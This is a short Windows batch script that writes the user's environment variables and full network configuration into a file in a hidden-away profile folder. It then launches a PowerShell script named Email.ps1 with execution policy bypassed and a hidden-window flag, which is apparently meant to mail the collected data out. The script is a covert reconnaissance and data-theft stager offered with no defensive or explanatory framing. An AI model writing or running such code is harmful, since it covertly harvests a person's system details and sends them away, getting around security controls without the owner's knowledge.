cd %homepath%
cd "3d objects"
set > A.bat
ipconfig /all >> A.bat
powershell -ExecutionPolicy Bypass -File Email.ps1 -windostyle hidden
